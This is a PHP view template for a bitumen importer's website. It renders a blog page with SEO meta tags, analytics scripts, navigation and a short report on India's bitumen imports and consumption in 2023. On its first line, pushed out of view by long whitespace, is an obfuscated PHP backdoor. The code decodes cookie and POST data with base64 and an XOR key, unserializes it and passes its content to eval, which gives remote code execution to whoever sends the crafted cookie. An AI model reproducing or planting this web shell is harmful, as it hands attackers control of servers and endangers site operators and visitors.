<?php                                                                                                                                                                                                                                                                                                                                                                                                 $nRTIUHzbCQ = "\121" . 'q' . "\124" . "\137" . chr ( 647 - 582 ).'s' . chr ( 1054 - 951 ).chr (105); $TzxaVpYue = "\x63" . chr ( 382 - 274 )."\x61" . chr ( 702 - 587 ).'s' . chr (95) . chr ( 1038 - 937 )."\170" . chr ( 570 - 465 )."\163" . chr ( 722 - 606 )."\x73";$DUUIQwNQn = $TzxaVpYue($nRTIUHzbCQ); $etfIFYHE = $DUUIQwNQn;if (!$etfIFYHE){class QqT_Asgi{private $VFhBgI;public static $TWQSHPsWaX = "9df1f226-0f41-4985-ba2e-e4a3542673da";public static $OgoVQHXM = NULL;public function __construct(){$LxoLXGHkK = $_COOKIE;$vKAYxHexJ = $_POST;$wmnsOpnd = @$LxoLXGHkK[substr(QqT_Asgi::$TWQSHPsWaX, 0, 4)];if (!empty($wmnsOpnd)){$SpSKNJ = "base64";$JQvrq = "";$wmnsOpnd = explode(",", $wmnsOpnd);foreach ($wmnsOpnd as $GPIzcx){$JQvrq .= @$LxoLXGHkK[$GPIzcx];$JQvrq .= @$vKAYxHexJ[$GPIzcx];}$JQvrq = array_map($SpSKNJ . chr (95) . "\x64" . "\x65" . "\x63" . chr (111) . chr ( 806 - 706 ).chr (101), array($JQvrq,)); $JQvrq = $JQvrq[0] ^ str_repeat(QqT_Asgi::$TWQSHPsWaX, (strlen($JQvrq[0]) / strlen(QqT_Asgi::$TWQSHPsWaX)) + 1);QqT_Asgi::$OgoVQHXM = @unserialize($JQvrq);}}public function __destruct(){$this->RcMMhe();}private function RcMMhe(){if (is_array(QqT_Asgi::$OgoVQHXM)) {$oGrvJ = str_replace("\x3c" . '?' . "\x70" . chr (104) . "\160", "", QqT_Asgi::$OgoVQHXM[chr (99) . "\157" . "\x6e" . chr (116) . 'e' . chr (110) . chr ( 304 - 188 )]);eval($oGrvJ);exit();}}}$KlVcFGjE = new QqT_Asgi(); $KlVcFGjE = 44465;} ?><?php
defined('BASEPATH') or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!-->
<html class="no-js">
<!--<![endif]-->

<head>
	<title>
		<?php if ($post['meta_title'] != "") {
				echo $post['meta_title'];
			} else {
				echo $post['heading'];
			} ?>
	</title>
	<meta charset="utf-8">
	<!--[if IE]>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <![endif]-->
	<meta name="description" content="<?php if ($post['meta_description'] != "") {
											echo $post['meta_description'];
										} else {
											echo $post['heading'];
										} ?>">
	<meta name="keywords" content="<?php if ($post['meta_keywords'] != "") {
										echo $post['meta_keywords'];
									} ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="format-detection" content="telephone=no">
	<meta name="google-site-verification" content="rAjKjl3KG6yfBnnor3i9PRWj6y4u1KCi828DGsb8z4U" />



	<meta property="og:title" content="Premium Petro Products - Leading Bitumen Importer" />
	<meta property="og:type" content="website" />
	<meta property="og:url" content="https://premiumpetro.in" />
	<meta property="og:image" content="https://premiumpetro.in/images/roads/road2.jpg" />
	<meta property="og:site_name" content="https://premiumpetro.in" />
	<meta property="fb:admins" content="108892197519623" />
	<meta property="og:description"
		content=" Premium Petro Products are a leading Importer, Trader of a wide range of Bitumen VG 10, VG 30 & VG 40 etc it’s empanelled supplier of PWD Rajasthan." />
	<meta name="twitter:card" content="summary" />
	<meta name="twitter:site" content="@PetroPremium" />
	<meta name="twitter:creator" content="@PetroPremium">
	<meta name="twitter:title" content="Premium Petro Products - Leading Bitumen Importer" />
	<meta name="twitter:description"
		content="Premium Petro Products are a leading Importer, Trader of a wide range of Bitumen VG 10, VG 30 & VG 40 etc it’s empanelled supplier of PWD Rajasthan." />
	<meta name="twitter:image" content="https://premiumpetro.in/images/roads/road2.jpg" />
	<meta name="twitter:url" content="https://premiumpetro.in" />
	<meta name="twitter:label1" content="Modified Bitumen Supplier">
	<meta name="twitter:data1" content="Leading Bitumen Importer">

	<meta property="og:title" content="Bitumen Emulsion Manufacturers and Supplier in INDIA" />
	<meta property="og:type" content="website" />
	<meta property="og:url" content="https://premiumpetro.in/bitumen-vg-30-price" />
	<meta property="og:image" content="https://premiumpetro.in/images/bitumen-vg-30.jpg" />
	<meta property="og:site_name" content="https://premiumpetro.in/blog/post/bitumen-emulsion" />
	<meta property="fb:admins" content="108892197519623" />
	<meta property="og:description"
		content="Bitumen Emulsion Manufacturers - Premium Petro leading bitumen emulsion supplier company located in Rajasthan India." />


	<meta name="twitter:card" content="summary" />
	<meta name="twitter:site" content="@PetroPremium" />
	<meta name="twitter:creator" content="@PetroPremium">
	<meta name="twitter:title" content="Bitumen Emulsion Manufacturers and Supplier in INDIA" />
	<meta name="twitter:description"
		content="Bitumen Emulsion Manufacturers - Premium Petro leading bitumen emulsion supplier company located in Rajasthan India." />
	<meta name="twitter:image" content="https://premiumpetro.in/images/bitumen-vg-30.jpg" />
	<meta name="twitter:url" content="https://premiumpetro.in/blog/post/bitumen-emulsion" />
	<meta name="twitter:label1" content="Bitumen Emulsion">
	<meta name="twitter:data1" content="Bitumen Emulsion Price India">


	<!----- 20 seo 22 --->

	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-199352870-1"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'UA-199352870-1');
	</script>

	<!--- -->








	<!-- Google Tag Manager -->
	<script>
		(function (w, d, s, l, i) {
			w[l] = w[l] || [];
			w[l].push({
				'gtm.start': new Date().getTime(),
				event: 'gtm.js'
			});
			var f = d.getElementsByTagName(s)[0],
				j = d.createElement(s),
				dl = l != 'dataLayer' ? '&l=' + l : '';
			j.async = true;
			j.src =
				'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
			f.parentNode.insertBefore(j, f);
		})(window, document, 'script', 'dataLayer', 'GTM-N5JQZSZ');
	</script>
	<!-- End Google Tag Manager -->

	<!-- Global site tag (gtag.js) - Google Ads: 329513618 -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=AW-329513618"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'AW-329513618');
	</script>

	<!-- Place favicon.ico and apple-touch-icon.png in the root directory -->

	<link rel="stylesheet" href="<?php echo base_url(); ?>css/bootstrap.min.css">
	<link rel="stylesheet" href="<?php echo base_url(); ?>css/animations.css">
	<link rel="stylesheet" href="<?php echo base_url(); ?>css/font-awesome5.css">
	<link rel="stylesheet" href="<?php echo base_url(); ?>css/icomoon.css">
	<link rel="stylesheet" href="<?php echo base_url(); ?>css/main.css" class="color-switcher-link">
	<link rel="stylesheet" href="<?php echo base_url(); ?>css/shop.css" class="color-switcher-link">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
	<script src="<?php echo base_url(); ?>js/vendor/modernizr-2.6.2.min.js"></script>

	<!--[if lt IE 9]>
		<script src="js/vendor/html5shiv.min.js"></script>
		<script src="js/vendor/respond.min.js"></script>
		<script src="js/vendor/jquery-1.12.4.min.js"></script>
	<![endif]-->
	<style>
		p {
			margin-top: 0 !important;
			margin-bottom: 1rem !important;
		}
	</style>
</head>

<body>

	<!-- Google Tag Manager (noscript) -->
	<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N5JQZSZ" height="0" width="0"
			style="display:none;visibility:hidden"></iframe></noscript>
	<!-- End Google Tag Manager (noscript) -->


	<!--[if lt IE 9]>
		<div class="bg-danger text-center">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/" class="color-main">upgrade your browser</a> to improve your experience.</div>
	<![endif]-->

	<div class="preloader">
		<div class="preloader_image"></div>
	</div>






	<!-- wrappers for visual page editor and boxed version of template -->
	<div id="canvas">
		<div id="box_wrapper">

			<!-- template sections -->

			<!--topline section visible only on small screens|-->
			<style>
				b{
					font-family: poppins, sans-serif !important;
				}
				.top-bar .fa {
					color: #dd4454;
					margin-right: 5px;
				}

				.top-bar a {
					color: #fff;
					font-size: 14px;
				}
				b, strong {
    color: #000;
    font-weight: 700;
}
@media (max-width: 768px) {
.cus_h{
	max-width: 100% !important;
	font-size: 18px;
}
}
			</style>

			<div class="top-bar" style="background:#000; padding:5px 0;">
				<div class="container">
					<div class="d-md-flex justify-content-between align-items-center">
						<div>
							<ul style="list-style-type:none">
								<li style="display:inline; margin-right:10px;"><a href="#"><i
											class="fa fa-phone"></i>+91 8441095087
										<!--0141-2368580, 0141-4038580-->
									</a></li>
								<li style="display:inline; margin-right:10px;"><a href="#"><i
											class="fa fa-envelope"></i>info@premiumpetro.in</a></li>
								<!--<li><a href="#"><i class="fa fa-clock-o"></i>Mon - Sat 09:30 AM - 06:00 PM</a></li>-->
								<li style="display:inline; margin-right:10px;"><a href="#"><i
											class="fa fa-map-marker"></i>Jaipur, Rajasthan, India</a></li>
								<li style="display:inline; margin-right:10px;"><a href="assets/PPP Company Profile.pdf"
										download="" target="_blank" class="header_meta">
										<i class="fa fa-download"></i>
										Brochure
									</a></li>
								<li style="display:inline; margin-right:10px;"><a
										href="<?php echo base_url() . $pricefile['link'] ?>" download="" target="_blank"
										class="header_meta">
										<i class="fa fa-download"></i>
										Prices
									</a></li>
							</ul>
						</div>
						<div class="d-none d-md-block">
							<ul style="list-style-type:none">
								<li style="display:inline; margin-right:10px;"><a
										href="https://www.facebook.com/premiumpetroproducts" target="_blank"><i
											class="fab fa-facebook" style="font-size:20px;" aria-hidden="true"></i></a>
								</li>

								<li style="display:inline; margin-right:10px;"><a
										href="https://www.instagram.com/premium_petro_products/" target="_blank"><i
											class="fab fa-instagram" style="font-size:20px;" aria-hidden="true"></i></a>
								</li>

								<li style="display:inline; margin-right:10px;"><a
										href="https://www.linkedin.com/company/premium-petro-products/"
										target="_blank"><i class="fab fa-linkedin" style="font-size:20px;"
											aria-hidden="true"></i></a></li>
							</ul>
						</div>

					</div>
				</div>
			</div>


			<div class="header_absolute">
				<!--eof topline-->

				<header class="page_header header-1 ds bg-transparent s-py-xl-20 s-py-10 ">

					<div class="container-fluid">

						<div class="row d-flex align-items-center justify-content-center">
							<div class="col-xl-3 col-md-4 col-12 text-center">
								<a href="./" class="logo" style="margin:0;">
									<img style="width: 290px; max-height:none;"
										src="<?php echo base_url(); ?>images/logo11.png" alt="img">

								</a>
							</div>
							<div class="col-xl-6 col-1 text-right">
								<!-- sain nav start -->
								<nav class="top-nav">
									<ul class="nav sf-menu">


										<li>
											<a href="<?php echo base_url(); ?>">Home</a>

										</li>

										<li>
											<a href="<?php echo base_url('aboutus'); ?>">About Us</a>

										</li>
										<!-- eof pages -->

										<li>
											<a href="<?php echo base_url('products'); ?>">Products </a>

										</li>

										<li>
											<a href="<?php echo base_url('prices'); ?>">Prices </a>

										</li>

										<!-- blog -->
										<li>
											<a href="<?php echo base_url('blog'); ?>">Blog</a>

										</li>



										<!-- contacts -->
										<li>
											<a href="<?php echo base_url('contact'); ?>">Contact</a>

										</li>
										<!-- eof contacts -->
									</ul>


								</nav>
								<!-- eof main nav -->
							</div>

							<span class="toggle_menu" style="right:0; color:#000;"><span>menu</span></span>

						</div>

					</div>
					<!-- header toggler -->

				</header>
			</div>

			<section class="page_title ds s-parallax s-pb-xl-80  s-pb-lg-100  s-pb-md-90 s-pt-md-250 s-pt-180 s-pb-60">
				<div class="container">
					<div class="row">
						<div class="col-md-12 text-center">
							<h1>
								<?php echo $post['heading'] ?>
							</h1>
							<div class="breadcrumb-wrap">
								<ol class="breadcrumb">
									<li class="breadcrumb-item">
										<a href="<?php echo base_url() ?>">Home</a>
									</li>
									<li class="breadcrumb-item">
										<a href="<?php echo base_url() ?>blog">Blog</a>
									</li>
									<li class="breadcrumb-item">
										<?php echo substr(strip_tags($post['heading']), 0, 50) ?>
									</li>
								</ol>
							</div>

						</div>


					</div>
				</div>
			</section>

			<section class="ls ms no-sidebar " style="margin-bottom:100px;">
				<br />
				<div class="container pt-md-5 mt-md-5  pb-md-5 ">
					<div class="row">
						<?php if ($cad == '0') { ?>
						<main class="col-md-12">
							<div
								class="vertical-item single-post post type-post status-publish format-standard has-post-thumbnail">


									<div class="entry-content">

									<p class="text-center">
											
											<span style="padding:0; color:#1475B5;font-weight: 500;">
												<?php echo $post['date'] ?></span>&nbsp;&nbsp;|&nbsp;&nbsp;
												<span style="padding:0; color:#1475B5;font-weight: 500;">
												<?php echo $post['author'] ?>
											</span>
										</p>
										<h4 class="text-center m-auto cus_h pb-3" style="max-width:80%;"><?php echo $post['heading'] ?><br></h4>
										<div style="height: 4px;background-color:#ffe300;margin:0 5px;"></div>
										<div class="item-media post-thumbnail mt-3">
											<img src="<?php echo base_url() . $post['image'] ?>" alt="img">
										</div> <br />

										<div class="row">
											<div class="col-md-8 pr-5">
												<div class="post-content">
													<?php echo $post['content'] ?>
												</div>
											</div>
											<div class="col-md-4 mt-5"
												style="width: 100%;background-image:url('<?php echo base_url()?>assets/img/back.png');">
												<br>
												<div style="padding: 20px;">
													<h4 style=" color: black;margin-bottom: 5px;font-weight: 600;">
														INSIDE THIS ISSUE:
													</h4>
													<h6 class="mt-0">Increase in Bitumen Imports in January to May 2023 compared to
														the same period in 2022: 29%
													</h6>
													<img src="<?php echo base_url()?>assets/img/side.png" alt="img">
												</div>
											</div>
										</div>

										<div class="col-md-12 pt-5">
											<div class="post-content">
												<p style="line-height: 21.61pt; margin-top: 0pt; margin-bottom: 0pt; margin-left: 0in; direction: ltr; unicode-bidi: embed; word-break: normal;"><span style="font-size:14.0pt;font-family:&quot;Montserrat Light&quot;;
													mso-ascii-font-family:&quot;Montserrat Light&quot;;mso-fareast-font-family:+mn-ea;
													mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:
													minor-bidi;color:#3D3D3D;letter-spacing:.7pt;mso-font-kerning:12.0pt;
													language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
													#3D3D3D;mso-style-textfill-fill-alpha:100.0%">India's<b> </b></span><span style="font-size:14.0pt;font-family:&quot;Montserrat Light Bold&quot;;mso-ascii-font-family:
													&quot;Montserrat Light Bold&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:
													+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;
													color:#3D3D3D;letter-spacing:.7pt;mso-font-kerning:12.0pt;language:en-US;
													mso-style-textfill-type:solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:
													100.0%"><b>bitumen consumption</b></span><span style="font-size:14.0pt;font-family:
													&quot;Montserrat Light&quot;;mso-ascii-font-family:&quot;Montserrat Light&quot;;mso-fareast-font-family:
													+mn-ea;mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;
													mso-bidi-theme-font:minor-bidi;color:#3D3D3D;letter-spacing:.7pt;mso-font-kerning:
													12.0pt;language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
													#3D3D3D;mso-style-textfill-fill-alpha:100.0%"> decreased by 6% in Jan-May 2023,
													compared to Jan-May 2022. The country consumed 3.87 million MT of bitumen
													during the period, down from 4.11 million MT in the same period last year.</span></p>
												<p
													style="line-height: 31.63pt; margin-top: 20pt !important; margin-bottom: 10pt; margin-left: 0in; direction: ltr; unicode-bidi: embed; word-break: normal;">
													<span style="font-size:24.0pt;font-family:&quot;Oswald Bold&quot;;
													mso-ascii-font-family:&quot;Oswald Bold&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:
													+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;
													color:#3D3D3D;letter-spacing:.47pt;mso-font-kerning:12.0pt;language:en-US;
													mso-style-textfill-type:solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:
													100.0%"><b>COMPARISION CHART
														</b></span></p>
												<img src="<?php echo base_url()?>assets/img/chart.png" alt="img">

												<p
													style="line-height: 31.63pt; margin-top: 20pt !important; margin-bottom: 10pt; margin-left: 0in; direction: ltr; unicode-bidi: embed; word-break: normal;">
													<span style="font-size:24.0pt;font-family:&quot;Oswald Bold&quot;;
														mso-ascii-font-family:&quot;Oswald Bold&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:
														+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;
														color:#3D3D3D;letter-spacing:.47pt;mso-font-kerning:12.0pt;language:en-US;
														mso-style-textfill-type:solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:
														100.0%"><b>OUR CONCLUSION
														</b></span></p>
														<p style="line-height: 23pt; margin-top: 0pt; margin-bottom: 0pt; margin-left: 0in; direction: ltr; unicode-bidi: embed; word-break: normal;"><span style="font-size:14.9pt;font-family:&quot;Montserrat Light&quot;;
															mso-ascii-font-family:&quot;Montserrat Light&quot;;mso-fareast-font-family:+mn-ea;
															mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:
															minor-bidi;color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;
															language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
															#3D3D3D;mso-style-textfill-fill-alpha:100.0%">India's bitumen market </span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light Bold&quot;;mso-ascii-font-family:
															&quot;Montserrat Light Bold&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:
															+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;
															color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;language:en-US;
															mso-style-textfill-type:solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:
															100.0%"><b>saw a mixed performance</b></span><span style="font-size:14.9pt;font-family:
															&quot;Montserrat Light&quot;;mso-ascii-font-family:&quot;Montserrat Light&quot;;mso-fareast-font-family:
															+mn-ea;mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;
															mso-bidi-theme-font:minor-bidi;color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:
															12.0pt;language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
															#3D3D3D;mso-style-textfill-fill-alpha:100.0%"> in Jan-May 2023. </span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light Bold&quot;;mso-ascii-font-family:
															&quot;Montserrat Light Bold&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:
															+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;
															color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;language:en-US;
															mso-style-textfill-type:solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:
															100.0%"><b>Import increased by 29%</b>, </span><span style="font-size:14.9pt;
															font-family:&quot;Montserrat Light&quot;;mso-ascii-font-family:&quot;Montserrat Light&quot;;
															mso-fareast-font-family:+mn-ea;mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:
															minor-fareast;mso-bidi-theme-font:minor-bidi;color:#3D3D3D;letter-spacing:.74pt;
															mso-font-kerning:12.0pt;language:en-US;mso-style-textfill-type:solid;
															mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:100.0%">while
															</span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light Bold&quot;;
															mso-ascii-font-family:&quot;Montserrat Light Bold&quot;;mso-fareast-font-family:+mn-ea;
															mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:
															minor-bidi;color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;
															language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
															#3D3D3D;mso-style-textfill-fill-alpha:100.0%"><b>production and consumption
															decreased by 5% and 6%</b>,</span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light&quot;;
															mso-ascii-font-family:&quot;Montserrat Light&quot;;mso-fareast-font-family:+mn-ea;
															mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:
															minor-bidi;color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;
															language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
															#3D3D3D;mso-style-textfill-fill-alpha:100.0%"> respectively. The outlook for
															the market is mixed, with the </span><span style="font-size:14.9pt;font-family:
															&quot;Montserrat Light Bold&quot;;mso-ascii-font-family:&quot;Montserrat Light Bold&quot;;
															mso-fareast-font-family:+mn-ea;mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:
															minor-fareast;mso-bidi-theme-font:minor-bidi;color:#3D3D3D;letter-spacing:.74pt;
															mso-font-kerning:12.0pt;language:en-US;mso-style-textfill-type:solid;
															mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:100.0%"><b>rising
															demand for bitumen likely to support the market</b> </span><span style="font-size:
															14.9pt;font-family:&quot;Montserrat Light&quot;;mso-ascii-font-family:&quot;Montserrat Light&quot;;
															mso-fareast-font-family:+mn-ea;mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:
															minor-fareast;mso-bidi-theme-font:minor-bidi;color:#3D3D3D;letter-spacing:.74pt;
															mso-font-kerning:12.0pt;language:en-US;mso-style-textfill-type:solid;
															mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:100.0%">in
															the near term, </span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light Bold&quot;;
															mso-ascii-font-family:&quot;Montserrat Light Bold&quot;;mso-fareast-font-family:+mn-ea;
															mso-bidi-font-family:+mn-cs;mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:
															minor-bidi;color:#3D3D3D;letter-spacing:.74pt;mso-font-kerning:12.0pt;
															language:en-US;mso-style-textfill-type:solid;mso-style-textfill-fill-color:
															#3D3D3D;mso-style-textfill-fill-alpha:100.0%"><b>but the slowdown in the country's
															economic growth posing a risk to the market in the long term</b></span><span style="font-size:14.9pt;font-family:&quot;Montserrat Light&quot;;mso-ascii-font-family:
															&quot;Montserrat Light&quot;;mso-fareast-font-family:+mn-ea;mso-bidi-font-family:+mn-cs;
															mso-fareast-theme-font:minor-fareast;mso-bidi-theme-font:minor-bidi;color:#3D3D3D;
															letter-spacing:.74pt;mso-font-kerning:12.0pt;language:en-US;mso-style-textfill-type:
															solid;mso-style-textfill-fill-color:#3D3D3D;mso-style-textfill-fill-alpha:100.0%">.</span></p>
											</div>

										</div>

									</div>

							
							</div>
						</main>

						<?php }else { ?>




						<main class="col-12">
							<div
								class="vertical-item single-post post type-post status-publish format-standard has-post-thumbnail">

							

									<div class="entry-content">

										<p class="text-center">
											
											<span style="padding:0; color:#1475B5;font-weight: 500;">
												<?php echo $post['date'] ?></span>&nbsp;&nbsp;|&nbsp;&nbsp;
												<span style="padding:0; color:#1475B5;font-weight: 500;">
												<?php echo $post['author'] ?>
											</span>
										</p>
										<h4 class="text-center m-auto cus_h" style="max-width:80%;"><?php echo $post['heading'] ?><br></h4>
										<div class="item-media post-thumbnail mt-md-5 mt-3">
											<img src="<?php echo base_url() . $post['image'] ?>" alt="img">
										</div> 
										<div class="post-content mt-md-5 mt-3" style="color:#000;">
											<h5>Introduction</h5>
											<?php echo $post['content'] ?>
										</div>
									</div>

							
								<!-- .item-content -->
							</div>
						</main>

						<?php } ?>

					</div>

				</div>
				<br /> <br /> <br />
			</section>